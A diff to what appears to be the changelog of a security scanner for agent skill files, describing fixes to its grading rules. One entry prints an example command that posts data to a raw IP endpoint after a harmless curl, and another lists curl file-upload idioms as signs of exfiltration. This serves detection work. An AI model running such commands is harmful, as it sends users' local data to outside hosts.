@@ -123,10 +123,10 @@ Registry checksum unchanged at `2414c32f04000b5d`; schema unchanged at `1.5`.
   an earlier draft of this entry reported it as zero.
 
   **Headline: recall untouched, precision marginally up.** Note that metric
-  is a
-  **composite** over `security` / `permission_hygiene` / `transparency`, which
-  is why a `permission_hygiene`-only change moves it; the `security`-axis-alone
-  gate is unmoved, because `pathTraversalRule` never stamps that axis.
+  is a **composite** over `security` / `permission_hygiene` / `transparency`,
+  which is why a `permission_hygiene`-only change moves it; the
+  `security`-axis-alone gate is unmoved, because `pathTraversalRule` never
+  stamps that axis.
 
 ## v0.8.0 — 2026-08-27
 
@@ -265,12 +265,11 @@ findings) — branch on the field, not on the code.
   statement did any of a *list of dangerous things*. A deny-list has to
   enumerate every dangerous thing a statement can do, fails open on
   everything it forgot, and ships in a public repo where an attacker reads
-  it. It forgot reverse shells entirely: in a `SKILL.md` fenced block, a
-  chained URL-plus-reverse-shell statement graded **security A** on a
-  Medium/`transparency` note, while the identical line in a `run.sh` graded
-  **D** — the whole difference was `isDocFile`. Two
-  more holes on the same rule: `suspiciousEndpoint` was applied to the
-  *first* URL of a statement only, so
+  it. It forgot reverse shells entirely: in a `SKILL.md` fenced block a
+  reverse shell chained after an `echo` graded **security A**, while the
+  identical line in a `run.sh` graded **D** — the whole difference was
+  `isDocFile`. Two more holes on the same rule: `suspiciousEndpoint` was
+  applied to the *first* URL of a statement only, so
   `curl https://api.example.com/v1 && curl -X POST http://185.220.101.5/collect`
   graded A and the reverse order graded D; and a call on a backslash
   continuation inside a doc file was never scanned at all, because the call
@@ -521,7 +520,7 @@ places and the hostile finding count is identical.
   SD-007 read the URL from the backslash-joined statement but did not skip the
   lines it consumed, so a wrapped command produced one finding per line —
   three for a single call. Found in review of this PR; it removed a small
-  number of duplicate findings, few enough that the headline results held.
+  number of duplicate findings, few enough not to move the entry above.
 - **`curl -d @file` counts as sending local state again.** `exfiltratesLocalData`
   returned early unless it saw `$(`, so the `@`-prefixed upload idiom —
   `-d @path`, `--data-binary @path`, `-F field=@path`, the form the repo's own
